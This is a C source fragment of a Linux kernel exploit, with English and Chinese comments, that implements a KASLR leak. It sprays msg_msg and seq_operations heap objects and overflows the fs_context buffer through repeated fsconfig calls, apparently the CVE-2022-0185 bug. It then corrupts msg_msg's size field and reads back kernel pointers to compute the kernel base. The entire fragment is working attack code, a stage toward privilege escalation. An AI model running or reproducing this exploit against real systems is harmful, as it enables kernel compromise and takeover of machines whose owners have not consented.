void *do_kaslr_leak () {
    uint64_t kbase = 0;
    char pat[0x30] = {0};
    char buffer[0x2000] = {0}, received[0x2000] = {0};//Prepare the fs_context buffer for overflowing
    msg *message = (msg *)buffer;
    int size = 0x1018;
    int targets[K_SPRAY] = {0};
    int i;
    //每个堆size是4096，我们先喷射4095bytes，然后系统调用：



//----------------------------------------------------PART ONE--------------------------------------------//
    //To gain our kernel address leak, we'll attempt to 'spray' allocations of seq_operations
    // - causing the kernel to create a large number of these objects on the heap, which live in the kmalloc-32 slab.
    // This is a useful struct to target as it can be allocated by opening /proc/self/stat,
    // and it contains 4 function pointers.

    // Spray queues/messages
    //Spray seq_operations structures into the kmalloc-32 slab
    for (i = 0; i < K_SPRAY; i++) {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }
    //attempt to 'spray' allocations of seq_operations -
    // Spray 4 function pointers
    for (int i = 0; i < 100; i++) {
        open("/proc/self/stat", O_RDONLY);
    }
    get_msg(targets[0], received, size - 0x30, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
    memset(pat, 0x42, sizeof(pat));
    pat[sizeof(pat)-1] = '\x00';
//----------------------------------------------------PART TWO--------------------------------------------//
// Use our overflow in kmalloc-4k to corrupt the m_ts/size field of the initial message

    fd = fsopen("ext4", 0);//打开一个文件系统，自动初始化一个4096bytes的堆上的buffer
    if (fd < 0) {
        exit(-1);
    }
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);//喷射4095bytes，让接下来写入的length不管多大都能成功写入，让堆接下来可以溢出，覆写msg_msg结构体
    }
    //因为两个堆是相连的，所以我们上一个堆写满了，会溢出到下一个堆中。
    // Corrupt the size field to 0x1060
    char tiny[] = "DDDDDDD";
    char tiny_evil[] = "DDDDDD\x60\x10";

//----------------------------------------------------PART THREE--------------------------------------------//
    //篡改 msg_msg->m_ts
    fsconfig(fd, FSCONFIG_SET_STRING, "CCCCCCCC", tiny, 0);//do Out-of-bound write
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", tiny_evil, 0);

    size = 0x1060;
    for (int i = 0; i < K_SPRAY; i++) {
        //try to get the 基址
        get_msg(targets[i], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        // Check for valid kernel pointer and aligned base
        kbase = do_check_leak(received);
        if (kbase) {
            return (void*)kbase;
        }
    }
    puts("[X] No leaks, trying again");
    close(fd);


    /*Overwrite Data structure: msg_msg
     struct msg_msg（）：
     {
    struct list_head 	m_list
    long 	m_type
    int 	m_ts
    struct msg_msgseg * 	next
    void * 	security
     }
     */
    return 0;
}